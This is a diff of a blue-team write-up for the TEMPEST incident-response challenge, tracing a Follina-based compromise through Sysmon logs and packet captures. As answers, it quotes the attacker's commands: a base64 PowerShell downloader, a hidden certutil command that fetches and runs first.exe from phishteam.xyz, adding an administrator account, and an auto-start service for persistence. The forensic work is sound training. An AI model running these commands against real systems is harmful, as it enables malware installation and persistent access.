@@ -16,8 +16,7 @@ Questions  
 - To get the SHA256 answers, we will have to open powershell and use Get-FileHash  -Algorithm SHA256 * in the directory where the files are located. 
 - Get-FileHash <--- unique specifier of Windows command line to request the hashvalue of a file.  
 - -Algorithm SHA256 * <--- detecting a type of hash of the file (in this case, the SHA256) and telling windows to pull all hash values within the directory.  
-    
-	![[268.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/268.png) 
 
 Question 1 Answer: CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6 
 Question 2 Answer: 665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F 
@@ -41,8 +40,7 @@ Questions 
 1. The use of this machine was compromised by a malicious document. What is the file name of the document?  
 - First, we need to set up the EZ Tool to investigate.  
 - Step 1: Open PowerShell and navigate to the Tools folder. 
-    
-	![[269.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/269.png)
 	  
 
 - Step 2: Once we are in the Tools folder, we should see a list of EvtxECmd files.  
@@ -54,75 +52,63 @@ Questions 
 	- *--csvf sysmon.csv* <--- This is specifying the filename of the CSV 
 	- CSV (Comma Separated Value) 
 	- This is a text file that is used to store table like data (spreadsheet or database) 
-    
-	![[270.png]]
+ ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/270.png)
+
 - The file should be in the directory of Incident Files  
-	 ![[271.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/271.png)
 
 - We should be able to view the log in Timeline Explorer 
-    
-	![[272.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/272.png)
 	 
 - Once opened, click on File-Open-sysmon.csv 
-    
-	![[273.png]]
+
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/273.png)
 	 
 
 - Step 3: We will now need to save a XML file type of the Sysmon file for visual presentation. 
 	- Go to Event Viewer then click on open saved logs and select the Sysmon file 
-    
-	![[274.png]]
-	- Navigate to the Saved Sysmon logs on Event Viewer 
-    
-	![[275.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/274.png)
+
+  - Navigate to the Saved Sysmon logs on Event Viewer 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/275.png)
 	 
 
 - Right-Click and select save all events 
 - Save the file as a xml type 
-    
-	![[276.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/276.png)
 	 
-Step 4: Open Sysmon Viewer and select File-Import Sysmon Log-Sysmon  
-
-![[277.png]] 
-
-	 
+Step 4: Open Sysmon Viewer and select File-Import Sysmon Log-Sysmon
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/277.png) 
 
 - In the report the SOC analysts stated there were a chrome.exe file, so let's select it in the Sysmon Viewer 
-    
-	![[279.png]]
-	 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/278.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/279.png)	 
 
 Questions 
-
 1. The user of this machine was compromised by a malicious document. What is the file name of the document? 
 - To answer this question, we can use either Sysmon Viewer or TimeLine Explorer. 
 - Sysmon Viewer 
-    
-	![[280.png]]
-	  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/280.png)
 
 - Timeline Explorer 
 - We can filter for “.doc” to reduce to output and scroll left to Payloads 1 – 6 
 - We can see a Download occurring in Payload Data 2  
-    
-	![[281.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/281.png)
 	 
 - Clicking on Payload Data 4 on the 2nd column, we can send the file here also.  
-    ![[282.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/282.png)
 	
 	Answer: free_magicules.doc 
 2. What is the name of the compromised user and machine?  
 	- Sysmon Viewer 
 	- We can click on Process Create, and it will show the user and machine that the download occurred on.  
-    
-	![[283.png]]
-	- Timeline Explorer  
+ ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/283.png)
+
+  - Timeline Explorer  
     
 
 - We can scroll left and see the Username and the machine associated with the user.  
-    
-	![[284.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/284.png)
 	 
 
 Answer: TEMPEST\benimaru 
@@ -130,58 +116,49 @@ Answer: TEMPEST\benimaru 
 3. What is the PID of the Microsoft Word process that opened the malicious document?  
 	- We will have to look at the Timeline of the occurance of the malicious activity occurring.  
 	- Still in the filter of “.doc”, we can scroll down since the timeline is in ascending order.  
-    
-	![[285.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/285.png)
+	
 	- We can see a Parent Command line executing the free_magicules.doc.  
-	![[286.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/286.png)
+	
 	- the screenshot above indicated that the command line was executed automatically when the document was opened. 
 	- Scrolling back to Payload Data 1, we can see the Process ID showing 496  
-    
-	![[287.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/287.png)
+	
 	- This is the start of PID 496 before the command line was executed.  
 
 Answer: 496 
 
-4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question.  
-    
-
+4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?  
 	- Filtering to the PID 496, in the Map Description Row, there were some Network Connection associated with PID 496. 
-    
-
 	- Since we are looking for an IPv4, we need to set our focus in the Network connection to analyze and see what IPv4 in a malicious domain is.  
-    
-	![[288.png]]
-	- Using the filtering editor, we can isolate only Network Connections. 
-	![[289.png]]
+ ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/288.png)
 
-	![[290.png]]
-	
+	- Using the filtering editor, we can isolate only Network Connections.
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/289.png)
 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/290.png)
 	- Looking through the Payload context, there we some HTTP protocols listed.  
 	- Let's filter only http (non-secure domain). 
 	- The IPv4 that is linked to the HTTP protocol was 167.71.199.191 
-    
-
-	![[291.png]] 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/291.png)
 	
-	Answer: 167.71.199.191 
+Answer: 167.71.199.191 
 
-5. What is the base64 encoded string in the malicious payload executed by the document?  
-    
-	
+6. What is the base64 encoded string in the malicious payload executed by the document?  
 	- We can filter base64 and 1 result has been displayed.  
-    
-	![[292.png]]
-	Answer: JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg== 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/292.png)
 
-6. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?  
+Answer: JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg== 
+
+7. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?  
     
 		
 	- Looking at the same cell content shown above, there was a command line with an executable called “msdt.exe”.  
-	- Looking up the executable in a web browser, Ia CVE number was returned with the results.  
-    
-	![[293.png]]
-	![[294.png]]
+	- Looking up the executable in a web browser, Ia CVE number was returned with the results.   
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/293.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/294.png)
+
 [Guidance for CVE-2022-30190 Microsoft Support Diagnostic Tool Vulnerability](https://www.microsoft.com/en-us/msrc/blog/2022/05/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability?msockid=14411f7e24d963171a8309ea258b6220) 
 
 Answer: CVE-2022-30190 
@@ -189,10 +166,8 @@ Answer: CVE-2022-30190 
 Initial Access – Stage 2 execution
 - Based on the findings, we discovered that there is a stage 2 execution 
 - The document executed an encoded bade64 command 
-    
-	![[295.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/295.png)
 	 
-
 - Decoding the string reveals the exact command chain executed by the malicious document.  
     
 
@@ -203,17 +178,15 @@ Question 
 	- We can filter for phishteam[.]xyz in Timeline Explorer. 
 	- We can also see in cyberchef screen shot that the path is somewhere align with \Microsoft\Windows\Start Menu\Programs\Startup 
 	- Let go to Timeline Explorer and filter for AppData and see if we can find a similar path with the user benimaru 
-    
-	![[296.png]]
+ ![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/296.png)
+	
 	Answer: “C:\Users\benimaru\AppDAta\Roaming\Microsoft\Windows\Start Menu\Programs\Startup” 
 
 2. The implanted payload executes once the user logs into the system. What is the full target path of the payload?  
 - I remembered seeing a powershell script when filtering for phishteam[.]xyz.  
 - Let's go back to that filter. 
-    
-	![[297.png]]
-	 
-	![[298.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/297.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/298.png)
 	
 Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe 
 - We can see a command line that is executing a powershell.exe in the WindowPowerShell 
@@ -221,31 +194,28 @@ Answer: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -no
 - The SHA256 hash is not the hash that is in the screenshot above. 
 - We can go to TimeExplorer and filter to first.exe 
 - Looking at the Parent Command Line, we can see the same path to the download binary as shown in the screenshot in question 2.  
-	    
-	![[299.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/299.png)
 	 
 - Looking at Payload Data 3, there are hash values that are associated with the first.exe binary download.  
-    
-	![[300.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/300.png)
+
 	Answer: CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8 
 
 3. The stage 2 payload download establishes a connection to a c2 server. What is the domain and the port used by the attacker? 
 - As we are still in the filter for first.exe, we can see a repeated query name starting with “res” in Payload Data4. 
-    ![[301.png]]
-	
-	
-	![[302.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/301.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/302.png)
 	 
 
 - Let now filter to resolvercyber.xyz to find the port associated with this domain.  
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/303.png)
 
-	![[303.png]]
 	- no port was found, so we must use Wireshark to determine the port
 - In wire shark we will filter with http.host contains “resolvecyber.xyz” 
 - - If we remembered from Wireshark http analysis, we know that we are asking Wireshark to look for the host that is associated with resolvecyber.xyz 
-    
-	![[304.png]]
-	Answer: resolvecyber.xyz:80 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/304.png)
+
+Answer: resolvecyber.xyz:80 
 
 Initial Access – Malicious Document Traffic 
 - Based on the collected findings, we discovered that the attacker fetched the stage 22 payload remotely:  
@@ -257,7 +227,7 @@ Questions 
 1. What is the URL of the malicious payload embedded in the document?  
 - Since the payload started with phishteam.xyz, we can use wWireshark to filter for the url by inserting http.host contains “phishteam.xyz” 
     
-	![[305.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/305.png)
 	 
 
 Answer http://phishteam.xyz/02dcf07/index.html 
@@ -267,7 +237,8 @@ Answer http://phishteam.xyz/02dcf07/index.html 
 - Knowing that the resolvecyber.xyz was a downloaded payload to establish the C2 connection, we can filter to the domain and determine its encoded type 
 - We can use http.host contains “resolvecyber” 
     
-	![[306.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/306.png)
+
 Answer: base64
 - Base64 are associated with upper- and lower-case letters with a total of 64 characters with the encoded value that have equals signs in the beginning and the end of the encoded value. 
     
@@ -284,8 +255,7 @@ Answer: base64
 - Reviewing question 2, we can see repeated “GET” method 
 6. Based on the user agent, what programming language was used by the attacker to compile the binary? 
 - We can find to user_agent by filtering with http.user_agent && http matches resolvecyber 
-    
-	![[307.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/307.png)
 	 
 Internal Reconnaissance 
 - Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic 
@@ -298,22 +268,22 @@ Questions 
 	- This will require combining the base64 encoded values to find the password. 
 	- We can use CyberChef to expedite the decoding of the base64 values.  
 	- I preferred to copy and paste all the base64 values to cyber chef to make it easier to review the results as they are already decoded.  
-		
-	![[308.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/308.png)
+
 Answer: infernotempest 
 
-2. The attacker enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?  
+3. The attacker enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?  
 Answer: 5985 
 - Since the machine is a Windows machine, we can research the related remote listening port.   
 - [Configuring PowerShell Remoting (WinRM) over HTTPS | Windows OS Hub](https://woshub.com/powershell-remoting-over-https/) 
 3. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?  
-	![[309.png]]
-    
-	![[310.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/309.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/310.png)
+
 Answer: C:\Users\benimaru\Downloads\ch.exe 
 
 4. What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?  
-    ![[311.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/311.png)
 	
 - We can find the SHA256 in TimeExplorer by filtering to the ch.exe (reverse proxy execution) 
 Answer: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D245 
@@ -321,9 +291,10 @@ Answer: 8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D245 
 5. What is the name of the tool used by the attacker based on the SHA256 hash? 
 - To answer this question, we can copy and paste the SHA256 hash value into virus total to retrieve the name of the tool that was used. 
 [VirusTotal - File - 8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451](https://www.virustotal.com/gui/file/8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451) 
-![[312.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/312.png)
 
 Answer: chisel 
+
 6. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?  
 Answer: winrm 
 - Since the adversary used listening port 5895 to gain remote access to the attacker machine and executed the chisel malware to create a reverse socks proxy from them the targets machine, we can conclude that the service the attacker used was Windows Remote (winrm) 
@@ -338,53 +309,45 @@ Questions 
 1. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 has of the binary? 
 - Downloading another binary is related to another process creation (Event ID: 1) in TimeExplorer 
 - Scroll to Event ID-Right Click-Filter Editor. 
-    ![[313.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/313.png)
+
 - Also, we can filter in the TimeExplorer “.exe” since we know this is another executable file that was downloaded. 
-    
-	![[314.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/314.png)
+
 - After going through the processes, we can notice and related binary executables that is associated with final.exe.  
 - Since we know the attacker have low privileges in the target (benimaru), they can download and executable another binary to increase their privileges.  
-    
-	![[315.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/315.png)
 
 Binary: spf.exe  
-- Let now filter to the executable to review its activities with the machine and discover the hash value. 
-    
-![[316.png]]
+- Let now filter to the executable to review its activities with the machine and discover the hash value.   
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/316.png)
 
 we can observe that all the “.exe” link to the same malicious domain “phishteam.xyz”; which means the attacker is using this main domain to perform its attacks on the targets machine.  
-	![[317.png]]
-	Answer: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D 
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/317.png)
+
+Answer: spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D 
 
 2. Based on the SHA256 hash of the binary, what is the name of the tool used?  
 - We can go to virus total and past the hash value to get the name of the tool.  
-    
-
 [VirusTotal - File - 8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d](https://www.virustotal.com/gui/file/8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d) 
-![[318.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/318.png)
 
 3. The tool exploits a specific privilege owned by the user. What is the name of the privilege? 
 	Answer: SeImpersonatePrivilege 
-
 [securityforge/printspoofer: PrintSpoofer is a Windows privilege escalation technique that abuses the Print Spooler service and Impersonation Tokens (particularly named pipe impersonation / SeImpersonatePrivilege) to escalate from a service or constrained user to SYSTEM on vulnerable Windows versions.](https://github.com/securityforge/printspoofer) 
-
 - PrintSpoofer is a Windows privilege escalation that abuses the PRint SpoolerService and Impersonate Tokens (pipe impersonation/SeImpersonatePrivilege) 
 
 4. The attacker executed the tool with another binary to establish a C2 connection. What is the name of the binary?  
-    
 	Answer: final.exe 
 	- Going back to question 1, we can see that the spf.exe was executed with the C2 connection executable final.exe.  
 	- [VirusTotal - File - 03e1840a24506afc88ab5ff7f83d2b07b558b34ff42dd34dd93267fd2e7a74e6](https://www.virustotal.com/gui/file/03e1840a24506afc88ab5ff7f83d2b07b558b34ff42dd34dd93267fd2e7a74e6/behavior) 
     
 5. The binary connects to a different port from the c2 connection. What is the port used? 
-    
 - We can go to TimeLine Explorer and filter to final.exe and read the Payload output to see which port the executable connects to.  
-    
-	![[319.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/319.png)
 
 
 Fully Owned Machine 
-
 - Now the attacker has gained administrative privileges inside the machine. Find all persistence techniques used by the attacker. 
 - The execution is related to the malicious C2 binary used during privilege escalation. 
 - We can use Brim to filter the traffic of resolvecyber.xyz with the port number 8080 with the following filter input: 
@@ -395,51 +358,40 @@ Questions: 
 1. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?  
 - There 2 methods to determine the users that were created  
 Method 1: Decoding the Base64 in cyberchef shown below: 
-![[320.png]]
-![[321.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/320.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/321.png)
 
 Method 2: Using Event Viewer and filtering to EVENT ID 4720 (User Created) 
 
-![[322.png]]
-
-![[323.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/322.png)
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/323.png)
 
 Answer: shion,shuna 
 
 2. Prior to the successful creation of the account, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail? 
-    
 	Answer: /add 
 	- Usually when an adversary tis attempting to add a user would use the attribute “/add” 
     
 3. Based on windows event logs, the account was successfully created. What is the event ID that indicates the account creation activity? 
-    
-
 Answer: 4720 
-
 - Going back to question 1, we can see that Event ID: 4720 was used to create the two users.  
     
 4. The attacker added one of the accounts in the local administrator’s group. What is the command used by the attacker?  
 - Going back to CyberChef we can find the command used since we already decoded the base64 values that we identified on brim.   
-    ![[324.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/324.png)
 Answer: net localgroup administrators /add shion 
 
 5. Based on windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?  
 - Based on EV logs ID’s, 4732 represents a user being added to a local group, in this case the administrators group.  
-	![[325.png]]  
-
-
-
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/325.png)  
 Answer: 4732 
 
 6. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?  
 - Going back to Final.exe, we can go to the executable row and review the execution that were done by the attacker to determine how they maintain persistence on the machine. 
-    ![[326.png]]
-	
-
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/326.png)
 
 - We can see that there was a binary path executable that occurred. 
 - Since we are trying to figure out how the attackers maintain persistence, they will have to tell the malware to autoStart whenever the machine is logged-on, shut-down, or restarted etc.  
-    
-    ![[327.png]]
+![alt text](https://github.com/DJackson-BlueTeam/Portfolio/blob/c4552c883490f1e603518ec1dbe8f349b33c5dec/SOC/SOC%20Challenges/TEMPEST/TEMPEST%20Img/327.png)
 
 - Answer: C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
